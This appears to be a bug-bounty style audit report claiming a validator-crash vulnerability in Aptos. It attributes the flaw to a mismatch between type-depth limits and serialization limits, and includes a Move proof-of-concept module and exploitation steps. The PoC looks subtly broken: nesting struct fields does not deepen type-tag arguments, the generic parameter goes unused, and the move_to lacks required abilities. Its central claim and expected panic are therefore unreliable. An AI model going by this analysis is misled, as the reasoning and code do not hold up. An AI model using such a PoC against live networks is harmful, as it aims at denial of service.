# Audit Report

## Title
Type Depth Mismatch Causes Validator Node Panic on Resource Group Operations

## Summary
A critical mismatch exists between the bytecode verification type depth limit (20) and the BCS serialization depth limit (8). This allows attackers to crash validator nodes by publishing Move modules with deeply nested struct types (depth 9-20) and invoking them in transactions, causing a panic when the VM attempts to serialize resource group access paths.

## Finding Description

The vulnerability stems from inconsistent depth limits across different validation layers in the Aptos codebase:

**Bytecode Verification Layer** allows types with depth up to 20: [1](#0-0) 

**BCS Serialization Layer** only allows depth up to 8: [2](#0-1) 

The critical issue occurs in the `resource_group_path_vec()` function which uses `.expect()` instead of proper error handling: [3](#0-2) 

Similarly, `code_path_vec()` has the same vulnerability: [4](#0-3) 

**Attack Flow:**
1. Attacker publishes a Move module containing struct types with nesting depth between 9-20 (passes bytecode verification)
2. Attacker submits a transaction calling an entry function that uses these deeply nested types as type arguments
3. During execution, the VM needs to access resources of these types (e.g., for resource groups)
4. The VM converts internal types to `StructTag` via the type tag converter: [5](#0-4) 

5. When creating storage keys, `StateKey::resource_group()` is called: [6](#0-5) 

6. This invokes `resource_group_path_vec()` which attempts BCS serialization
7. The serialization fails due to depth > 8, triggering the `.expect()` panic
8. **The validator node crashes**

The vulnerability is reachable through the data cache during resource operations: [7](#0-6) 

## Impact Explanation

**Severity: Critical** - This meets the "Total loss of liveness/network availability" criterion from the Aptos bug bounty program.

**Impact on Network:**
- An attacker can deterministically crash validator nodes by crafting specific transactions
- Multiple validators can be targeted simultaneously, causing widespread consensus disruption
- The attack can be repeated indefinitely as long as the vulnerable code path exists
- Network liveness is compromised when sufficient validators are taken offline

**Impact on Consensus:**
- Violates Invariant #1 (Deterministic Execution): Nodes crash non-deterministically based on which transactions they process
- Violates Invariant #2 (Consensus Safety): If enough validators crash, consensus may halt
- Creates potential for consensus splits if only some validators process the malicious transaction

**No Funds at Risk:** While this doesn't directly steal or freeze funds, the network availability impact is critical for a blockchain system.

## Likelihood Explanation

**Likelihood: High** - This vulnerability is easily exploitable with low barriers to entry.

**Attacker Requirements:**
- Ability to publish Move modules (standard user capability)
- Gas fees to publish module and submit transactions (minimal cost)
- No special privileges or validator access required

**Exploitation Complexity:**
- Low - Simply requires crafting a Move module with nested struct definitions
- Example: `struct A<T> { value: T }` nested 9+ levels deep
- Can be automated and repeated

**Detection Difficulty:**
- The attack appears as normal module publication and function calls
- No obvious pattern until nodes start crashing
- Difficult to trace back to specific malicious transactions post-crash

## Recommendation

**Immediate Fix:** Align the bytecode verification depth limit with the BCS serialization limit, or increase the BCS limit to match bytecode verification.

**Option 1: Reduce bytecode verification limit (Recommended)**
Modify the production config to set `max_type_depth` to 8: [1](#0-0) 

Change line 189 from `Some(20)` to `Some(8)`.

**Option 2: Increase BCS serialization limit**
Modify the serialization constant: [2](#0-1) 

Change from `8` to `20`. However, this may have performance implications and doesn't address the root issue of unbounded recursion protection.

**Option 3: Replace `.expect()` with proper error handling**
Convert panic-inducing code to return `Result`: [3](#0-2) 

Change `resource_group_path_vec()` to return `Result<Vec<u8>>` instead of `Vec<u8>`, and propagate errors properly through the call chain. Similarly for `code_path_vec()`.

**Recommended Solution:** Implement Option 1 (reduce to depth 8) AND Option 3 (proper error handling) for defense in depth.

## Proof of Concept

```move
// malicious_module.move
module attacker::deep_nesting {
    // Create deeply nested struct types (depth 9)
    struct Level0 { value: u64 }
    struct Level1 { inner: Level0 }
    struct Level2 { inner: Level1 }
    struct Level3 { inner: Level2 }
    struct Level4 { inner: Level3 }
    struct Level5 { inner: Level4 }
    struct Level6 { inner: Level5 }
    struct Level7 { inner: Level6 }
    struct Level8 { inner: Level7 }
    struct Level9 { inner: Level8 }
    
    // Entry function that triggers resource group access with deep type
    public entry fun trigger_crash<T: store>(account: &signer) {
        // Using Level9 as a type parameter forces the VM to serialize
        // a StructTag with depth 9, which exceeds MAX_TYPE_TAG_NESTING (8)
        move_to(account, Level9 { inner: Level8 { 
            inner: Level7 { inner: Level6 { inner: Level5 { 
                inner: Level4 { inner: Level3 { inner: Level2 { 
                    inner: Level1 { inner: Level0 { value: 42 }}
                }}}
            }}}
        }});
    }
}
```

**Exploitation Steps:**
1. Compile and publish the above module to the Aptos blockchain
2. Submit a transaction calling `trigger_crash()` with the deeply nested type as a type argument
3. When the transaction executes and the VM attempts to move the resource, it will:
   - Create a `StructTag` for `Level9` with depth 9
   - Attempt to serialize it via `resource_group_path_vec()` or `resource_path_vec()`
   - Hit the BCS depth limit and panic
4. The validator node processing this transaction crashes

**Expected Result:** Validator node terminates with panic message: "type tag nesting exceeded during serialization"

**Notes:**
- The actual crash depends on whether resource groups are used, but similar crashes can occur with regular resources
- The example can be extended to depth 20 for maximum impact
- Each validator that processes this transaction will crash, enabling targeted DoS attacks

### Citations

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L188-192)
```rust
        max_type_depth: if enable_function_values {
            Some(20)
        } else {
            None
        },
```

**File:** third_party/move/move-core/types/src/safe_serialize.rs (L11-11)
```rust
pub(crate) const MAX_TYPE_TAG_NESTING: u8 = 8;
```

**File:** types/src/access_path.rs (L125-127)
```rust
    pub fn resource_group_path_vec(tag: StructTag) -> Vec<u8> {
        bcs::to_bytes(&Path::ResourceGroup(tag)).expect("Unexpected serialization error")
    }
```

**File:** types/src/access_path.rs (L138-140)
```rust
    pub fn code_path_vec(key: ModuleId) -> Vec<u8> {
        bcs::to_bytes(&Path::Code(key)).expect("Unexpected serialization error")
    }
```

**File:** third_party/move/move-vm/types/src/loaded_data/struct_name_indexing.rs (L136-149)
```rust
    pub fn idx_to_struct_tag(
        &self,
        idx: StructNameIndex,
        ty_args: Vec<TypeTag>,
    ) -> PartialVMResult<StructTag> {
        let index_map = self.0.read();
        let struct_name = Self::idx_to_struct_name_helper(&index_map, idx)?.as_ref();
        Ok(StructTag {
            address: *struct_name.module().address(),
            module: struct_name.module().name().to_owned(),
            name: struct_name.name().clone(),
            type_args: ty_args,
        })
    }
```

**File:** types/src/state_store/state_key/mod.rs (L160-171)
```rust
    pub fn resource_group(address: &AccountAddress, struct_tag: &StructTag) -> Self {
        Self(
            REGISTRY
                .resource_group(struct_tag, address)
                .get_or_add(struct_tag, address, || {
                    Ok(StateKeyInner::AccessPath(
                        AccessPath::resource_group_access_path(*address, struct_tag.clone()),
                    ))
                })
                .expect("only possible error is resource path serialization"),
        )
    }
```

**File:** aptos-move/aptos-vm/src/data_cache.rs (L98-107)
```rust
    fn get_any_resource_with_layout(
        &self,
        address: &AccountAddress,
        struct_tag: &StructTag,
        metadata: &[Metadata],
        maybe_layout: Option<&MoveTypeLayout>,
    ) -> PartialVMResult<(Option<Bytes>, usize)> {
        let resource_group = get_resource_group_member_from_metadata(struct_tag, metadata);
        if let Some(resource_group) = resource_group {
            let key = StateKey::resource_group(address, &resource_group);
```
